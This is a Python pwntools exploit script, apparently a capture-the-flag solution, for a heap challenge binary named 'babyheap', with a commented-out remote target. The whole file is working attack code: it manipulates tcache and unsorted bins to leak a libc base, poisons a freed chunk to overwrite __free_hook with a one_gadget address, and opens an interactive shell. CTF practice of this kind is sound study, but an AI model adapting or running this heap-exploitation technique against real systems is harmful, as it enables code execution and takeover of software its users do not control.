#!/usr/bin/python
#coding=utf-8
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = "./babyheap"
# context.log_level = 'debug'
p = process("./babyheap")
# p = remote('47.111.104.169','57805')
elf = ELF("./babyheap")
libc = elf.libc
def add():
	p.sendlineafter('>>','1')
def show(idx):
	p.sendlineafter('>>','2')
	p.sendlineafter('index?\n',str(idx))
def edit(idx,size,payload):
	p.sendlineafter('>>','3')
	p.sendlineafter('index?\n',str(idx))
	p.sendlineafter('Size:\n',str(size))
	p.sendafter('Content:\n',payload)
def delete(idx):
	p.sendlineafter('>>','4')
	p.sendlineafter('index?\n',str(idx))
def exit():
	p.sendlineafter('>>','5')
for i in range(9):
	add()
for i in range(7):
	delete(i+2)
delete(0)
delete(1)
for i in range(7):
	add()
add() #7
add() #8
show(7)
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x3ebe90
info(hex(libc_base)) 
one = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = libc_base+one[1]
free_hook = libc_base+libc.sym['__free_hook']
add()

for i in range(6):
	delete(i)
delete(9)
delete(7)
delete(8)
delete(6)
for i in range(10):
	add()
for i in range(7):
	delete(i)
delete(7)
edit(8,0xF8,'aaaa')
delete(9)
#8
for i in range(7):
	add()
add()
add()
delete(8)
edit(9,0x20,p64(free_hook))
add()

add()
edit(10,0x20,p64(one_gadget))
delete(8)
p.interactive()